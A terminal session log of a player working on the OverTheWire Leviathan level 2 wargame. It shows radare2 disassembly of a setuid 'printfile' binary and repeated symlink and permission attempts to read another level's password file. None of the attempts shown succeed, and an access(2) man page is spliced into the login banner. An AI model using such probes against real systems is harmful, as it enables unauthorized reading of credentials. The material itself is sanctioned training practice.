Last login: Mon Jan  8 17:35:27 on ttys002
➜  ~ ssh leviathan2@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan2@leviathan.labs.overthewire.org's password:
Permission denied, please try again.
leviathan2@leviathan.labs.overthewire.org's password:
Permission denied, please try again.
leviathan2@leviathan.labs.overthewire.org's password:
Authentication failed.
➜  ~ ssh leviathan2@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan2@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan2@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan3 leviathan2 7596 Nov 13 16:03 printfile*
leviathan2@leviathan:~$ r2 printfile
 -- Select your architecture with: 'e asm.arch=<arch>' or r2 -a from the shell
[0x08048490]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x08048490]> pdf
            ;-- section..text:
            ;-- eip:
/ (fcn) entry0 33
|   entry0 ();
|           0x08048490      31ed           xor ebp, ebp                ; section 14 va=0x08048490 pa=0x00000490 sz=594 vsz=594 rwx=--r-x .text
|           0x08048492      5e             pop esi
|           0x08048493      89e1           mov ecx, esp
|           0x08048495      83e4f0         and esp, 0xfffffff0
|           0x08048498      50             push eax
|           0x08048499      54             push esp
|           0x0804849a      52             push edx
|           0x0804849b      68e0860408     push sym.__libc_csu_fini    ; 0x80486e0
|           0x080484a0      6880860408     push sym.__libc_csu_init    ; 0x8048680 ; "UWVS\xe87\xfe\xff\xff\x81\xc3w\x19"
|           0x080484a5      51             push ecx
|           0x080484a6      56             push esi
|           0x080484a7      688d850408     push main                   ; sym.main ; 0x804858d ; "U\x89\xe5S\x83\xe4\xf0\x81\xec0\x02"
\           0x080484ac      e89fffffff     call sym.imp.__libc_start_main ; int __libc_start_main(func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end)
[0x08048490]> pdf@main
            ;-- main:
/ (fcn) main 241
|   main (int arg_8h, int arg_ch);
|           ; var int local_4h_2 @ ebp-0x4
|           ; arg int arg_8h @ ebp+0x8
|           ; arg int arg_ch @ ebp+0xc
|           ; var int local_4h @ esp+0x4
|           ; var int local_8h @ esp+0x8
|           ; var int local_ch @ esp+0xc
|           ; var int local_1ch @ esp+0x1c
|           ; var int local_2ch @ esp+0x2c
|           ; var int local_22ch @ esp+0x22c
|              ; DATA XREF from 0x080484a7 (entry0)
|           0x0804858d      55             push ebp
|           0x0804858e      89e5           mov ebp, esp
|           0x08048590      53             push ebx
|           0x08048591      83e4f0         and esp, 0xfffffff0
|           0x08048594      81ec30020000   sub esp, 0x230
|           0x0804859a      8b450c         mov eax, dword [arg_ch]     ; [0xc:4]=-1 ; 12
|           0x0804859d      8944241c       mov dword [local_1ch], eax
|           0x080485a1      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
|           0x080485a7      8984242c0200.  mov dword [local_22ch], eax
|           0x080485ae      31c0           xor eax, eax
|           0x080485b0      837d0801       cmp dword [arg_8h], 1       ; [0x1:4]=-1 ; 1
|       ,=< 0x080485b4      7f2c           jg 0x80485e2
|       |   0x080485b6      c70424008704.  mov dword [esp], str.____File_Printer____ ; [0x8048700:4]=0x202a2a2a ; "*** File Printer ***"
|       |   0x080485bd      e85efeffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x080485c2      8b44241c       mov eax, dword [local_1ch]  ; [0x1c:4]=-1 ; 28
|       |   0x080485c6      8b00           mov eax, dword [eax]
|       |   0x080485c8      89442404       mov dword [local_4h], eax
|       |   0x080485cc      c70424158704.  mov dword [esp], str.Usage:__s_filename_n ; [0x8048715:4]=0x67617355 ; "Usage: %s filename\n"
|       |   0x080485d3      e818feffff     call sym.imp.printf         ; int printf(const char *format)
|       |   0x080485d8      b8ffffffff     mov eax, 0xffffffff         ; -1
|      ,==< 0x080485dd      e982000000     jmp 0x8048664
|      ||      ; JMP XREF from 0x080485b4 (main)
|      |`-> 0x080485e2      8b44241c       mov eax, dword [local_1ch]  ; [0x1c:4]=-1 ; 28
|      |    0x080485e6      83c004         add eax, 4
|      |    0x080485e9      8b00           mov eax, dword [eax]
|      |    0x080485eb      c74424040400.  mov dword [local_4h], 4
|      |    0x080485f3      890424         mov dword [esp], eax
|      |    0x080485f6      e875feffff     call sym.imp.access         ; int access(const char *path, int mode)
|      |    0x080485fb      85c0           test eax, eax
|      |,=< 0x080485fd      7413           je 0x8048612
|      ||   0x080485ff      c70424298704.  mov dword [esp], str.You_cant_have_that_file... ; [0x8048729:4]=0x20756f59 ; "You cant have that file..."
|      ||   0x08048606      e815feffff     call sym.imp.puts           ; int puts(const char *s)
|      ||   0x0804860b      b801000000     mov eax, 1
|     ,===< 0x08048610      eb52           jmp 0x8048664
|     |||      ; JMP XREF from 0x080485fd (main)
|     ||`-> 0x08048612      8b44241c       mov eax, dword [local_1ch]  ; [0x1c:4]=-1 ; 28
|     ||    0x08048616      83c004         add eax, 4
|     ||    0x08048619      8b00           mov eax, dword [eax]
|     ||    0x0804861b      8944240c       mov dword [local_ch], eax
|     ||    0x0804861f      c74424084487.  mov dword [local_8h], str._bin_cat__s ; [0x8048744:4]=0x6e69622f ; "/bin/cat %s"
|     ||    0x08048627      c7442404ff01.  mov dword [local_4h], 0x1ff ; [0x1ff:4]=-1 ; 511
|     ||    0x0804862f      8d44242c       lea eax, [local_2ch]        ; 0x2c ; ',' ; 44
|     ||    0x08048633      890424         mov dword [esp], eax
|     ||    0x08048636      e825feffff     call sym.imp.snprintf       ; int snprintf(char *s,
|     ||    0x0804863b      e8d0fdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|     ||    0x08048640      89c3           mov ebx, eax
|     ||    0x08048642      e8c9fdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|     ||    0x08048647      895c2404       mov dword [local_4h], ebx
|     ||    0x0804864b      890424         mov dword [esp], eax
|     ||    0x0804864e      e8edfdffff     call sym.imp.setreuid
|     ||    0x08048653      8d44242c       lea eax, [local_2ch]        ; 0x2c ; ',' ; 44
|     ||    0x08048657      890424         mov dword [esp], eax
|     ||    0x0804865a      e8d1fdffff     call sym.imp.system         ; int system(const char *string)
|     ||    0x0804865f      b800000000     mov eax, 0
|     ||       ; JMP XREF from 0x08048610 (main)
|     ||       ; JMP XREF from 0x080485dd (main)
|     ``--> 0x08048664      8b94242c0200.  mov edx, dword [local_22ch] ; [0x22c:4]=-1 ; 556
|           0x0804866b      653315140000.  xor edx, dword gs:[0x14]
|       ,=< 0x08048672      7405           je 0x8048679
|       |   0x08048674      e887fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |      ; JMP XREF from 0x08048672 (main)
|       `-> 0x08048679      8b5dfc         mov ebx, dword [local_4h_2]
|           0x0804867c      c9             leave
\           0x0804867d      c3             ret
[0x08048490]> q
r_sys_mkdirp: fail '/home/leviathan2/.config' of '/home/leviathan2/.config/radare2'
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan2
/bin/cat: /etc/leviathan_pass/leviathan2: Permission denied
leviathan2@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan3 leviathan2 7596 Nov 13 16:03 printfile*
leviathan2@leviathan:~$ ll /etc/leviathan_pass/
total 40
drwxr-xr-x   2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 100 root       root       4096 Dec 16 14:07 ../
-r--------   1 leviathan0 leviathan0   11 Nov 13 16:03 leviathan0
-r--------   1 leviathan1 leviathan1   11 Nov 13 16:03 leviathan1
-r--------   1 leviathan2 leviathan2   11 Nov 13 16:03 leviathan2
-r--------   1 leviathan3 leviathan3   11 Nov 13 16:03 leviathan3
-r--------   1 leviathan4 leviathan4   11 Nov 13 16:03 leviathan4
-r--------   1 leviathan5 leviathan5   11 Nov 13 16:03 leviathan5
-r--------   1 leviathan6 leviathan6   11 Nov 13 16:03 leviathan6
-r--------   1 leviathan7 leviathan7   11 Nov 13 16:03 leviathan7
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan4
You cant have that file...
leviathan2@leviathan:~$ ls /tmp/lammb/
ls: cannot access '/tmp/lammb/': No such file or directory
leviathan2@leviathan:~$ ls /tmp/xx
leviathan3
leviathan2@leviathan:~$ ls /tmp/xx/leviathan3
/tmp/xx/leviathan3
leviathan2@leviathan:~$ ll /tmp/xx/leviathan3
lrwxrwxrwx 1 leviathan2 leviathan2 30 Jan  8 10:39 /tmp/xx/leviathan3 -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:~$ ./printfile /tmp/xx/leviathan3
You cant have that file...
leviathan2@leviathan:~$ chmod 444 /tmp/xx/leviathan3
chmod: changing permissions of '/tmp/xx/leviathan3': Operation not permitted
leviathan2@leviathan:~$ printfile
.bash_logout  .bashrc       .profile      printfile
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/
leviathan2@leviathan:~$ chmod 444 /tmp/leviathan3
chmod: changing permissions of '/tmp/leviathan3': Operation not permitted
leviathan2@leviathan:~$ ./printfile .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
leviathan2@leviathan:~$ echo "a" > xx
-bash: xx: Permission denied
leviathan2@leviathan:~$ echo "a" > /tmp/xxx
-bash: /tmp/xxx: Permission denied
leviathan2@leviathan:~$ echo "a" > /tmp/xxxxxs
leviathan2@leviathan:~$ chmod 040 /tmp/xxxxxs
leviathan2@leviathan:~$ ./printfile /tmp/xxxxxs
You cant have that file...
leviathan2@leviathan:~$ chmod 004 /tmp/xxxxxs
leviathan2@leviathan:~$ ./printfile /tmp/xxxxxs
You cant have that file...
leviathan2@leviathan:~$ chmod 400 /tmp/xxxxxs
leviathan2@leviathan:~$ ./printfile /tmp/xxxxxs
/bin/cat: /tmp/xxxxxs: Permission denied
leviathan2@leviathan:~$ chmod 440 /tmp/xxxxxs
leviathan2@leviathan:~$ ./printfile /tmp/xxxxxs
a
leviathan2@leviathan:~$ chmod 540 /tmp/xxxxxs
leviathan2@leviathan:~$ ./printfile /tmp/xxxxxs
a
leviathan2@leviathan:~$ chmod 770 /tmp/xxxxxs
leviathan2@leviathan:~$ ./printfile /tmp/xxxxxs
a
leviathan2@leviathan:~$ ll /tmp/xx/leviathan3
lrwxrwxrwx 1 leviathan2 leviathan2 30 Jan  8 10:39 /tmp/xx/leviathan3 -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:~$ ll /etc/leviathan_pass/leviathan3
-r-------- 1 leviathan3 leviathan3 11 Nov 13 16:03 /etc/leviathan_pass/leviathan3
leviathan2@leviathan:~$ ./printfile /tmp/xx/leviathan3
You cant have that file...
leviathan2@leviathan:~$ xxd /tmp/xx/leviathan3
xxd: /tmp/xx/leviathan3: Permission denied
leviathan2@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan3 leviathan2 7596 Nov 13 16:03 printfile*
leviathan2@leviathan:~$ xxd /tmp/xx/leviathan3packet_write_wait: Connection to 176.9.9.172 port 2223: Broken pipe
➜  ~
➜  ~
➜  ~
➜  ~
➜  ~ scp leviathan2@leviathan.labs.overthewire.org:2223/home/leviathan2/printfile .
ssh: connect to host leviathan.labs.overthewire.org port 22: Network is unreachable
➜  ~ brew install qemu-system*
➜  ~ scp -P2223 leviathan2@leviathan.labs.overthewire.org:/home/leviathan2/printfile .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan2@leviathan.labs.overthewire.org's password:
printfile                                                                                                     100% 7596    17.5KB/s   00:00
➜  ~ ssh leviathan2@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan2@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
ACCESS(2)                                                 Linux Programmer's Manual                                                ACCESS(2)

NAME
       access, faccessat - check user's permissions for a file

SYNOPSIS
       #include <unistd.h>

       int access(const char *pathname, int mode);

       #include <fcntl.h>           /* Definition of AT_* constants */
       #include <unistd.h>

       int faccessat(int dirfd, const char *pathname, int mode, int flags);

   Feature Test Macro Requirements for glibc (see feature_test_macros(7)):

       faccessat():
           Since glibc 2.10:
               _XOPEN_SOURCE >= 700 || _POSIX_C_SOURCE >= 200809L
           Before glibc 2.10:
               _ATFILE_SOURCE

DESCRIPTION
       access() checks whether the calling process can access the file pathname.  If pathname is a symbolic link, it is dereferenced.

       The  mode  specifies the accessibility check(s) to be performed, and is either the value F_OK, or a mask consisting of the bitwise OR
       of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the existence of the file.  R_OK, W_OK, and X_OK test whether the file exists
       and grants read, write, and execute permissions, respectively.

       The  check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an
       operation (e.g., open(2)) on the file.  Similarly, for the root user, the check uses the set of permitted  capabilities  rather  than
       the set of effective capabilities; and for non-root users, the check uses an empty set of capabilities.

       This  allows set-user-ID programs and capability-endowed programs to easily determine the invoking user's authority.  In other words,
       access() does not answer the "can I read/write/execute this file?" question.  It answers a slightly  different  question:  "(assuming
       I'm  a setuid binary) can the user who invoked me read/write/execute this file?", which gives set-user-ID programs the possibility to
       prevent malicious users from causing them to read files which users shouldn't be able to read.

       If the calling process is privileged (i.e., its real UID is zero), then an X_OK check is successful for a  regular  file  if  execute
       permission is enabled for any of the file owner, group, or other.

   faccessat()
       The faccessat() system call operates in exactly the same way as access(), except for the differences described here.

       If  the  pathname  given in pathname is relative, then it is interpreted relative to the directory referred to by the file descriptor
       dirfd (rather than relative to the current working directory of the calling process, as is done by access() for a relative pathname).

       If pathname is relative and dirfd is the special value AT_FDCWD, then pathname is interpreted relative to the current working  direc-
       tory of the calling process (like access()).

       If pathname is absolute, then dirfd is ignored.

       flags is constructed by ORing together zero or more of the following values:

       AT_EACCESS
              Perform access checks using the effective user and group IDs.  By default, faccessat() uses the real IDs (like access()).

       AT_SYMLINK_NOFOLLOW
              If pathname is a symbolic link, do not dereference it: instead return information about the link itself.

       See openat(2) for an explanation of the need for faccessat().

RETURN VALUE
       On success (all requested permissions granted, or mode is F_OK and the file exists), zero is returned.  On error (at least one bit in
       mode asked for a permission that is denied, or mode is F_OK and the file does not  exist,  or  some  other  error  occurred),  -1  is
       returned, and errno is set appropriately.

ERRORS
       access() and faccessat() shall fail if:

       EACCES The requested access would be denied to the file, or search permission is denied for one of the directories in the path prefix
              of pathname.  (See also path_resolution(7).)

       ELOOP  Too many symbolic links were encountered in resolving pathname.

       ENAMETOOLONG
              pathname is too long.

       ENOENT A component of pathname does not exist or is a dangling symbolic link.

       ENOTDIR
              A component used as a directory in pathname is not, in fact, a directory.

       EROFS  Write permission was requested for a file on a read-only filesystem.

       access() and faccessat() may fail if:

       EFAULT pathname points outside your accessible address space.

       EINVAL mode was incorrectly specified.

       EIO    An I/O error occurred.

       ENOMEM Insufficient kernel memory was available.

       ETXTBSY
              Write access was requested to an executable which is being executed.

       The following additional errors can occur for faccessat():

       EBADF  dirfd is not a valid file descriptor.

       EINVAL Invalid flag specified in flags.

       ENOTDIR
              pathname is relative and dirfd is a file descriptor referring to a file other than a directory.

VERSIONS
       faccessat() was added to Linux in kernel 2.6.16; library support was added to glibc in version 2.4.

CONFORMING TO
       access(): SVr4, 4.3BSD, POSIX.1-2001, POSIX.1-2008.

       faccessat(): POSIX.1-2008.

NOTES
       Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2)  cre-
       ates  a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.
       For this reason, the use of this system call should be avoided.  (In the example just described, a safer alternative would be to tem-
       porarily switch the process's effective user ID to the real ID and then call open(2).)

       access() always dereferences symbolic links.  If you need to check the permissions on a symbolic link, use faccessat(2) with the flag
       AT_SYMLINK_NOFOLLOW.

       These calls return an error if any of the access types in mode is denied, even if some of the other access types in mode are  permit-
       ted.

       If  the  calling  process has appropriate privileges (i.e., is superuser), POSIX.1-2001 permits an implementation to indicate success
       for an X_OK check even if none of the execute file permission bits are set.  Linux does not do this.
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan2@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan3 leviathan2 7596 Nov 13 16:03 printfile*
leviathan2@leviathan:~$ man access
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan2
/bin/cat: /etc/leviathan_pass/leviathan2: Permission denied
leviathan2@leviathan:~$ mkdir -p /tmp/la/
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/la/
leviathan2@leviathan:~$ ll /tmp/la
total 20
drwxrwxr-x   2 leviathan2 leviathan2  4096 Jan  9 08:43 ./
drwxrwx-wt 271 root       root       16384 Jan  9 08:42 ../
lrwxrwxrwx   1 leviathan2 leviathan2    30 Jan  9 08:43 leviathan3 -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:~$ ll /tmp/la/leviathan3
lrwxrwxrwx 1 leviathan2 leviathan2 30 Jan  9 08:43 /tmp/la/leviathan3 -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:~$ chmod 777  /tmp/la/leviathan3
chmod: changing permissions of '/tmp/la/leviathan3': Operation not permitted
leviathan2@leviathan:~$
leviathan2@leviathan:~$ xxd /tmp/la/leviathan3
xxd: /tmp/la/leviathan3: Permission denied
leviathan2@leviathan:~$ ./printfile /tmp/la/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan2 /tmp/la/
leviathan2@leviathan:~$ ./printfile /tmp/la/leviathan2
/bin/cat: /tmp/la/leviathan2: Permission denied
leviathan2@leviathan:~$ find / -group leviathan2 -user leviathan3
find: '/etc/ssl/private': Permission denied
find: '/etc/polkit-1/localauthority': Permission denied
find: '/run/lxcfs': Permission denied
find: '/run/user/12003': Permission denied
find: '/run/user/12001': Permission denied
find: '/run/user/12000': Permission denied
find: '/run/user/12006': Permission denied
find: '/run/sudo': Permission denied
find: '/run/log/journal/0d8e66480c320675a338622759f86ace': Permission denied
find: '/run/lvm': Permission denied
find: '/run/systemd/inaccessible': Permission denied
find: '/run/lock/lvm': Permission denied
find: '/dev/mqueue': Permission denied
find: '/dev/shm': Permission denied
find: '/lost+found': Permission denied
find: '/root': Permission denied
/home/leviathan2/printfile
find: '/home/leviathan0/.backup': Permission denied
find: '/home/leviathan4/.trash': Permission denied
find: '/var/log': Permission denied
find: '/var/lib/puppet': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/polkit-1': Permission denied
find: '/var/spool/rsyslog': Permission denied
find: '/var/spool/cron/atspool': Permission denied
find: '/var/spool/cron/atjobs': Permission denied
find: '/var/spool/cron/crontabs': Permission denied
find: '/var/crash': Permission denied
find: '/var/tmp': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/tmp': Permission denied
find: '/sys/fs/fuse/connections/39': Permission denied
find: '/sys/kernel/debug': Permission denied
find: '/proc/tty/driver': Permission denied
find: '/proc/2826/task/2826/fd/6': No such file or directory
find: '/proc/2826/task/2826/fdinfo/6': No such file or directory
find: '/proc/2826/fd/5': No such file or directory
find: '/proc/2826/fdinfo/5': No such file or directory
leviathan2@leviathan:~$ find /  -user leviathan3
find: '/etc/ssl/private': Permission denied
/etc/leviathan_pass/leviathan3
find: '/etc/polkit-1/localauthority': Permission denied
find: '/run/lxcfs': Permission denied
/run/user/12003
find: '/run/user/12003': Permission denied
find: '/run/user/12001': Permission denied
find: '/run/user/12000': Permission denied
find: '/run/user/12006': Permission denied
find: '/run/sudo': Permission denied
find: '/run/log/journal/0d8e66480c320675a338622759f86ace': Permission denied
find: '/run/lvm': Permission denied
find: '/run/systemd/inaccessible': Permission denied
find: '/run/lock/lvm': Permission denied
find: '/dev/mqueue': Permission denied
find: '/dev/shm': Permission denied
/dev/pts/1
find: '/lost+found': Permission denied
find: '/root': Permission denied
/home/leviathan2/printfile
find: '/home/leviathan0/.backup': Permission denied
find: '/home/leviathan4/.trash': Permission denied
find: '/var/log': Permission denied
find: '/var/lib/puppet': Permission denied
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-12003.slice/user@12003.service
